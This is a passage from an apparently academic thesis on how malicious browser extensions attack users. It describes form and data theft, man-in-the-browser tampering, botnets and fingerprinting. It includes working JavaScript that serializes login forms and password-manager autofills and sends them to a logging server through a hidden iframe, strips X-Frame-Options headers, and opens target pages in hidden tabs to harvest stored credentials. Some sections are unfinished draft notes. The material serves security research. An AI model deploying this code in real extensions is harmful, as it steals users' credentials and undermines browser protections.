		\item \textbf{JavaScript Benchmark Testing} The execution speed of a JavaScript engine depends on the implementation but also on the systems processor architecture and clock speed. Keaton Mowery et al. implemented a set of benchmark test suits to fingerprint different execution speeds \cite{MBYS11}. Using these information, they could distinguish between major browser versions, operating systems and micro architectures. 
	\end{itemize}



\subsection{Communication}

	An important part for browser attacks is the communication between the malicious extension and the attacker. We have already shown that we can load scripts from remote servers. In this section, we focus on communication to prepare or execute attacks. \\ %TODO
	
	We can use the a XMLHttpRequest to send data to a remote server. We have preciously shown in \autoref{xhrLoadScript}, that we can fetch a remote script with an XMLHttpRequest. A similar implementation can be used to send any information to a server. Only the method that handles the response needs to be adapted. In our implementation, we used the code shown in \autoref{xhrSendData} to send a message to our remote server. Similar to \autoref{xhrLoadScript}, we first create a new XMLHttpRequest object and set the request type and the target URL. Because we only want to send information out and do not care about the response, we do not need to declare a response handler like the implementation in \autoref{xhrLoadScript} on line 2 till 6. Instead, we have to set the request's \textit{Content-type} header. This allows our server to correctly decode the web request's message. We decided to use the standard URL notation \cite{w3cUrlSpecifications}. Finally, we deliver our message to the send method which executes the request. 
	
	\begin{code}
		\begin{lstlisting}
var xhr = new XMLHttpRequest();
xhr.open('POST', 'https://localhost:3001/log');
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.send(message);
\end{lstlisting}
		\caption{Send data to a remote server with a XMLHttpRequest}
		\label{xhrSendData}
	\end{code}
	
	Another strategy to transfer information to a remote host was described by Liu et al. \cite{Liu12chromeextensions:}. They analyzed possible threats in Chrome's extension model through malicious behavior and conducted that an extension can executed HTTP requests to any arbitrary host without cross-site access privileges. For that purpose, they used the mechanics of an \textit{iframe} element. Its task is to display a web page within another web page. The displayed web page is defined by the URL stored inside the iframe's \textit{src} attribute. If the URL changes, the iframe reloads the web page. Adding parameters to the URL allows to send data to the targeted server. As a proof of concept, we implemented the content script shown in \autoref{contentScriptSendDataWithIframe} to send data to our remote server. It creates a new \texttt{iframe} element, hides it by setting the iframe's display style to \texttt{none}, and appends it to the web pages body. The function \texttt{send(data)} expects a string in the standard URL notation \cite{w3cUrlSpecifications}. We append the current web page's URL to the outgoing data to later identify the origin of the transmitted information. Finally, we set the \texttt{src} attribute of our iframe element to execute the web request. \\
	
	\begin{code}
		\begin{lstlisting}
var iframe = document.createElement('iframe');
iframe.setAttribute('style', 'display: none;');
document.body.appendChild(iframe);

function send(data) {
	data += "&url=" + encodeURIComponent(window.location.href);
	iframe.setAttribute('src', 'https://localhost:3001/log?' + data);
}
\end{lstlisting}
		\caption{Content script that sends data to a remote server using an \texttt{iframe} element}
		\label{contentScriptSendDataWithIframe}
	\end{code}
	
	The Same Origin Policy creates a boundary between the iframe and it's parent web page. It prevents scripts to access content that has another origin than the script itself. Therefore, if the web page inside the iframe was loaded from another domain as the parent web page, the iframe's JavaScript can not access the parent web page and vice versa. This boundary does not prevent an extension to access information in an iframe. The extension can execute a content script in every web page hence in the iframe's web page, too. This allows us to use the content script in \autoref{contentScriptSendDataWithIframe} for a two way communication channel. Executing a second content script inside the iframe, allows us to read information which our server has embedded inside the fetched web page. \\
	
	In previous researches, Liu et al. implemented extensions for major browsers that can be remote controlled to execute web based attacks such as \texttt{Denial of Service} or spamming. \cite{liu2011botnet, Liu12chromeextensions:}. To control the extensions and send needed information such as the target for a DoS attack or a spamming text, the attacker has to communicate with his extensions. Liu et al. use the automatic update of extensions for that purpose. The browser checks for any extension update on startup and periodically on runtime. The attacker can distribute an attack by pushing a new update and the extension can read commands from a file in it's bundle. This communication channel is more stealthy than previous approaches because no web request is executed between the extension and the attacker. The update process is a legitimate function of the browser and therefore it does not trigger any anti-virus software. \\			



\subsection{Attack Vectors}



\subsubsection{Accessing The Web Page}
	
	An extension has full access to the displayed web page and it's DOM. It can read any information and modify the web page in any arbitrary way. A malicious extension can misuse this access and execute several attacks with the use of a content script. To execute the content script in any web page, the attacker may use the URL pattern \texttt{http://*/*}, \texttt{https://*/*}, or \texttt{<all\_urls>}. We present some general attack scenarios in the following list. \\
	
	\begin{itemize}
		\item \textbf{Steal User Data From Forms} Any information the user transmits over a form in a web page is accessible for an extension. To steal this information, the extension adds an event listener which is dispatched when the user submits the form. At this time, the extension can read out all information that the user has entered in the form. This approach gives the attacker access to the user's personal information such as his address, email, phone number, or credit card number but also to identification data such as social security number, identity number, or credentials. Especially username and password for website login are typically transmitted over a form.
		
		\item \textbf{Steal Displayed User Data} Any information about the user that a web page contains is accessible for an extension. To steal this information, the attacker has to explicit know where it is stored in the web page. This is mostly a trivial task, because most web pages are public and the attacker is therefore able to analyze the targeted web page's structure. To target a specific HTML element, the attacker needs a proper CSS selector. For that purpose, he can use the developer console which is provided by current browser's such as Chrome, Firefox, or Opera. With this attack, an attacker is able to obtain a broad range of different information such as the user's financial status from his banking portal, his emails and contacts, his friends and messages from social media, or bought items and shopping preferences.
		
		\item \textbf{Modify Forms} An extension can add new input elements to a form. This tricks the user into filling out additional information that are not necessary for the website but targeted by the attacker. For that purpose, the extension adds the additional input fields to the form when the web page loads, steals the information when the user submits the form, and removes the additional fields afterwards. The last step is necessary because the web application would return an error the form's structure was modified. This attack will succeed if the user does not know the form's structure beforehand. To decrease the probability that the user knows the form already, the extension can determinate whether or not the user has visited the web page to an earlier date before executing the attack. 
		
		\item \textbf{Modify Links} An extension can modify the URL of a link element to redirect the user to a another web page. This page may be malicious and infect the user's device with malware or it may be a duplicate of the web page to which the link originally led and steal the user's data. But the attacker may also enrich himself through the extension's users. Some companies pay money for every time someone loads a specific web page. The attacker can redirect the user to this web page and gain more profit. 
	\end{itemize}
	
	Lujo Bauer et al. described several attacks for WebExtensions and implemented them as a proof of concept. They focused on stealing credentials which the browser has stored for the user. An WebExtension with the host permissions \texttt{https://*/*} and \texttt{http://*/*} can open any other web page. For instance with the method \texttt{chrome.tabs.update} which is no restricted by any permissions. \\
	
	\cite{extensions:cns14} many attacks for web extension sorted by permissions, implemented each attack as proof of concept, host permission \texttt{http://*/*}, can load other web pages by e.a. \texttt{chrome.tabs.update} which is not restricted by the \texttt{tabs} permission, if browser has stored auto fill data extension can steal them, load other web page in current tab is very suspicious, more stealthy by loading web page in inactive tab or even in other window which is currently in background, these information can be accessed with the \texttt{chrome.tabs} API and do not need the \texttt{tabs} permission too, other stealthy approach is to use an iframe, can be hidden from the user by loading in background tab, invisible or very small, webextension needs \texttt{all\_frames} option for content scripts to execute content script in iframe, including \texttt{all\_frames} does not cause additional warning, many web pages set \texttt{X-Frame-Options} header to disallow being opened in iframe, they implemented an extension that sets the security header to \texttt{ALLOW} using the \texttt{webRequestBlocking} permission and API, user tracking and identifying with an extension, reading user information such as facebook name, email addresses or other sensitive data, cross devices tracking if extension is installed on multiple devices, check same username used on different devices, tracking mouse movements and key input using document events, history sniffing with \texttt{history} permission \\


	
\subsubsection{Execute Web Attacks}
	
	\cite{liu2011botnet, Liu12chromeextensions:} bot net, password sniffing, DoS attack and spamming, DoS either by XHR or DOM, webextension: XHR needs host permissions, spamming uses user's email account, catches credentials if user logs into email account, sends emails on behalf of user, stealthy because many different email addresses are used for spamming and spamming is distributed in time, \\
	
	A botnet is a network consisting of multiple compromised clients which can be controlled remotely. They are mostly used to execute large scaled cyber attacks such as Distributed Denial of Service (DDoS) or spamming. In recent times, botnets are also used to harvest social media valuations such as Facebook's likes. The controller of such a botnet - also called bot master - sales these valuations to thousands and executes them with the social media accounts which are used on the compromised machines. With the same manner, the bot master can execute DDoS attacks to make a web service unavailable for the general public. This is achieved by overwhelming the server's capacities with requests. Either targeting the network and flooding it's bandwidth or the application itself using up all of the computer's CPU resources. A simple Denial of Service (DoS) attack calls the targeted web service numerous times a second from a single origin. If the attacker uses a botnet, he is able to perform the DoS attack from multiple devices simultaneously which results in an ever bigger overwhelm at the targeted server. \\
	
	Extensions may be used as a bots. They are hosted on many different computers and can execute web requests. 
	Extensions that act as a bot where previously researched for Internet Explorer, Firefox and Chrome \cite{liu2011botnet}. \\


	
\subsubsection{Intercept Requests}
	
	The Man-in-the-browser (MITB) is a browser based attack related to man-in-the-middle attack (MITM) \cite{Curran:2012:MBA:2433195.2433198}. It intercepts and alters web traffic to simulate a false environment for the user where his interactions will harm himself. \\
	
	The MITM is an attack scenario in computer cryptography against a direct communication between two parties where the attacker secretly gains access to the exchanged messages. This gives him the opportunity to either steal desired information or alter the communication. If he alters the traffic in the right way, he is able to impersonate one party and deceive the other one to think the communication is still private. To gain access to the communication channel, an MITM attacker has to use vulnerabilities in obsolete cryptography algorithm or exploits in buggy implemented soft or hardware. An MITB attack on the other hand is located inside the browser from where it intercepts in and outgoing web requests. The attack will be successful irrespective of security mechanisms because it takes place before any encryption or authentication is applied. \\
	
	An MITB attacker often manipulates the code base of a browser to perform his attacks and therefore needs access to the user's machine. A simpler realization of MITB attacks can be achieved using extensions. An extension can manipulate a web page to show false information and alter outgoing web requests without knowledge of the user. It is a part of the browser itself and therefore obviates the need to manipulate the browser's code base which also decreases the probability of discovery. \\
	
	A simple MITB attack scenario using an extension: The user logs into the online platform of his bank to perform a transaction. He enters needed information into the provided form and submits it back to the bank's server. The extension reads the outgoing web request and changes the target account and rises the transfer amount. The banking system will not recognize the manipulated request. It will trust to request because the communication channel is secured and the user was successfully identified. To review and check the transaction, the banking system sends back an receipt to the user. The extension intercepts the returning web request and changes the previously manipulated data back to its original state. The user does not recognize the manipulation at this point, too. To hamper such attacks, modern banking systems use an extra verification before they execute the transaction. It often consists a piece of information which comes from an external source. For example, a TAN generator calculates a values from the target account number, the transfer amount, and some data stored on the user's banking card. This would prevent our attack scenario, because the value which is entered by the user will not match the value calculated on the server and the extension can not access the information on the banking card to calculate the correct value itself. \\



\section{Implementations}



	\subsubsection{Steal Credentials}
	
	We implemented an extension that steals credentials from a login form. It uses two content scripts without the need for further permissions. The one shown in \autoref{contentScriptStealCredentialsOnSubmit} steals the credentials if the user submits the login form. The other one shown in \autoref{contentScriptStealCredentialsFromPasswordManager} steals the credentials if the browser's password manager has filled them in the login form. To send the stolen credentials to our remote server, we use the \texttt{send} method shown in \autoref{contentScriptSendDataWithIframe}. Both content scripts start by querying an input field of type password and getting the proper form element. The content script in \autoref{contentScriptStealCredentialsOnSubmit} adds an event listener to the form element on line 4 which is triggered if the user submits the form. It then forwards the form's content to our send method in the proper format. The content script in \autoref{contentScriptStealCredentialsFromPasswordManager} checks if the password element's value is not empty on line 5 and forwards the form's content in that case to our send method on line 6. We delay the execution of line 5 and 6 with the \texttt{setTimeout} function to give the password manager enough time to fill in the credentials. \\
	
	\begin{code}
		\begin{lstlisting}	
var passwordElement = $('input[type="password"');
if(passwordElement.length > 0) {
	var form = passwordElement.closest('form');
	form.submit(function(event) {
		send(form.serialize());
	});
}
\end{lstlisting}
		\caption{Content Script that steals credentials from a login form if the user submits the form.}
		\label{contentScriptStealCredentialsOnSubmit}
	\end{code}
	
	\begin{code}
		\begin{lstlisting}
var passwordElement = $('input[type="password"');
	if(passwordElement.length > 0) {
		var form = passwordElement.closest('form');
		setTimeout(function() {
			if(passwordElement.val() != '') {
				send(form.serialize());
		}
	}, 500);
}
\end{lstlisting}
		\caption{Content Script that steals credentials from a login form if the browser's password manager has filled in the credentials.}
		\label{contentScriptStealCredentialsFromPasswordManager}
	\end{code}
	
	
	Furthermore, we implemented several extensions that open predefined login web pages to steal probably stored credentials from the browser's password manager. Different strategies to hide the loading of a new web page were previously discussed by Lujo Bauer et al. \cite{extensions:cns14}. We implemented three described techniques:
	
	\begin{enumerate}
		\itemsep-0.3em
		\item Load the targeted web page in an invisible iframe inside any web page.
		\item Load the targeted web page in an inactive tab and switch back to the original web page after the attack has finished.
		\item Open a new tab in an inactive browser window and load the targeted web page in this tab. Close the tab after the attack has finished.
	\end{enumerate} 
	
	The first technique is the least reliable one. There exists several methods to enforce that a web page is not displayed in an iframe. The standardized approach is to use the \texttt{X-Frame-Option} HTTP header which is compatible with all current browsers \cite{xFrameOptionsSpezification, xFrameOptionsCompability}. This transfers the responsibility to enforce the policy to the browser. Other approaches use JavaScript to deny the web page's functionality if it is loaded in an iframe or simply move the web page from the iframe to the main frame. \\
	
	Our implementation removes the \texttt{X-Frame-Option} from any incoming web request to be able to load particular web pages into an iframe and steal probably stored credentials. For that purpose, our extension needs the permissions \texttt{"webRequest"}, \texttt{"webRequestBlocking"}, \texttt{"https://*/*"}, and \texttt{"http://*/*"}. Our implementation of this part is shown in \autoref{backgroundRemoveXFrameOptionsHeader}. We use the \texttt{chrome.webRequest} module to add an event listener that is triggered when the browser receives HTTP headers for a response. The \texttt{addListener} method on line 1 takes additional arguments on line 9. These define that the listener is triggered on any URL that matches \texttt{https://*/*} or \texttt{http://*/*}, the request is blocked until the listener finishes, and the listener has access to the response's headers. Our listener iterates over the headers, compares if the header's name equals x-frame-options, and removes the header in this case. \\
	
	To open a particular web page in an iframe, we use a content script with the \texttt{any\_frame} option which enables the content script in iframes, too. The content script is shown in \autoref{contentScriptOpenWebPageInIframe}. It checks whether or not it is currently active in the main frame on the first line. If it is active in an iframe, we use the implementation shown in \autoref{contentScriptStealCredentialsFromPasswordManager} to steal the probably stored credentials. If the content script is currently active in the main frame, we send a message to the extension's background to retrieve a URL. This is necessary because the content script itself can not store data - in our case a list of URLs - between different instances of itself. On line 4 till 7 we create a new iframe, make it invisible, set it's source attribute to the given URL, and add it to the document's body. \\
	
	\begin{code}
		\begin{lstlisting}
chrome.webRequest.onHeadersReceived.addListener(function(details) { 
	details.responseHeaders.forEach(function(header, index){
		if(header.name.toLowerCase() === "x-frame-options"){
			details.responseHeaders.splice(index,1);
		}
	});
	return({responseHeaders: details.responseHeaders});
},
{urls: ['https://*/*', 'http://*/*']}, ['blocking', 'responseHeaders']);
\end{lstlisting}
		\caption{Extension code to remove the \texttt{X-Frame-Options} header from any incoming web request.}
		\label{backgroundRemoveXFrameOptionsHeader}
	\end{code} 
	
	\begin{code}
		\begin{lstlisting}
if(window.self === window.top) {
	chrome.runtime.sendMessage({get: 'url'}, function(response) {
		if(response.url) {
			var newIframe = document.createElement('iframe');
			newIframe.setAttribute('style', 'display: none;');
			newIframe.setAttribute('src', response.url);
			document.body.appendChild(newIframe);
		}
	});
}
else { ... }
\end{lstlisting}
		\caption{Content script to open a particular web page in an iframe.}
		\label{contentScriptOpenWebPageInIframe}
	\end{code}
	
	The second and third technique work very similar. Both use the browser's tab system to open a particular web page and inject a content script in it to steal probably stored credentials. \autoref{backgroundOpenPageInInactiveTab} shows the implementation of our extension that opens a particular web page in an inactive tab. Our extension needs the \texttt{tabs} permission to access the URL of the current tab. We query all tabs to find one that is not active and not a browser intern tab. On line 10, we store the tab's current URL to later switch the tab back to it's original state. Then, we update the current tab and load our targeted web page. The \texttt{setInterval} function helps us to check every 100 milliseconds whether the tab has finished loading the web page. This is necessary for the injection of our content script to work. If the tab has finished loading, we inject our content scripts in combination with a local copy of jQuery in the current tab. Finally, we have to load the original web page in the tab after our content script has stolen the credentials. We use the communication channel between content script and the extension's background to notify the background that the content script has finished. On line 25, we register an event listener that loads the original web page in the sender tab if a proper message arrives. \\
	
	Our implementation of the third technique differs only in a few lines from our implementation of the second technique shown in \autoref{backgroundOpenPageInInactiveTab}. First, we query for a tab that is not in the currently active window. Second, we create a new tab instead of updating the queried one and do not store the current tabs URL. This also removes the necessity for the \texttt{tabs} permission. And finally, we close the tab when the content script messages that it has finished the attack. \\ 
	
	\begin{code}
		\begin{lstlisting}
function openPageInInactiveTab(url) {
	var queryOptions = {
		active: false,
		windowType: "normal"
	}
	chrome.tabs.query(queryOptions, function (tabs) {		
		if(tabs.length === 0) {
			return;
		}
		oldUrl = tabs[0].url;
		chrome.tabs.update(tabs[0].id, {url: url}, function(tab) {
			var interval = setInterval(function() {
				chrome.tabs.get(tab.id, function(tab) {
					if(tab.status === 'complete') {
						clearInterval(interval);
						chrome.tabs.executeScript(tab.id, {file: 'jquery.js'});
						chrome.tabs.executeScript(tab.id, {file: 'content.js'});
					}
				});
			}, 100);
		});
	});
}
chrome.runtime.onMessage.addListener(function(message, sender) {
	if(sender.tab && message.status === 'finished') {
	c	hrome.tabs.update(sender.tab.id, {url: oldUrl});
	}
});
\end{lstlisting}
		\caption{Extension code to open a particular web page in an inactive tab to steal probably stored credentials.}
		\label{backgroundOpenPageInInactiveTab}
	\end{code}
	
	We tested our implementations in Chrome, Opera, and Firefox. To our surprise, they were only successful in Firefox. The reason that none of our attacks work in Chrome and Opera is that JavaScript has no access to the value of a password input field before any user interaction with the web page occurred. What first seems like a bug is an intended security feature to prevent exactly our kind of attack \cite{chromiumBlogPasswordInput}.
	
	
	
\subsection{Identifier Storage} 
	
	An extension is able to store information between browser sessions. Chrome provides an additional cloud based storage that is automatically synced with all devices if the user uses Chrome with his Google account. Firefox Add-ons on the other hand are able to store information on the user's hard disk. We can use this mechanism to provide a storage for a tracking identifier additional to cookies or similar. Such identifier are propagated from a web page to the browser. To receive one, we can use a previous described technique for communicate between a content script and the underlying web page. \\ %TODO maybe remove propagation part
	
	
	
\subsection{Web Beacon}
	
	This is another tracking method which we can support with an extension. It notifies a third party that a specific web page was accessed by fetching a resource from a server and sending possible tracking cookies along the request. We implemented an extension that embeds an image of one pixel in size in every visited web page. When the browser fetches the image, it sends a tracking cookie along the request or fetches a new one. The extension needs a single content script with the matching attributes \texttt{"http://*/*"} and \texttt{"https://*/*"} and no further permissions. The content script is shown in \autoref{contentScriptWebBeacon}.
	
	\begin{code}
		\begin{lstlisting}
		var img = document.createElement('img');
		img.setAttribute('src', 'https://localhost:3001/images/pixel.png');
		document.body.appendChild(img);
		\end{lstlisting}
		\caption{Content script that injects a tracking pixel in the current web page.}
		\label{contentScriptWebBeacon}
	\end{code}
	
	
	
\subsection{Keylogger} 
	
	JavaScript enables us to register events for every interaction the user has with the current web page. This gives us the possibility to exactly observe what elements the user clicks, double clicks, or drag and drops and what text he enters in input fields. If we combine all these information, we are able to track the user on his path through the web page. 
	
	
	
\subsection{Fingerprinting} 
	
	The browser provides additional information to its extension which are not available for web pages. Those information may be used to generate a more accurate fingerprint of the user's browser and system. Accessing the information needs additional permissions. \autoref{fingerprintExtension} shows provided information that may be retrieved for a fingerprint and the permissions needed to access them. \\
	
	\begin{table}[h]
		\begin{tabular}{|l|l|l|} \hline
			\textbf{Permission} & \textbf{Information} & \textbf{Example} \\ \hline
			system.cpu & Number of processor kernels & \\
			& Processor's name & Intel(R) Core(TM) i5-3210M CPU @ 2.50GHz \\
			& Processor's capabilities & "sse", "sse2", "sse3"  \\ \hline
			system.memory & Memory capacity & 6501200096 \\ \hline
			gcm & An unique ID for the extension instance & \\ \hline
			management & List of installed extensions & Extension ID and version \\ \hline
		\end{tabular}
		\caption{Additional fingerprint information available to WebExtension}
		\label{fingerprintExtension}
	\end{table} 
	

\section{Extension Analysis}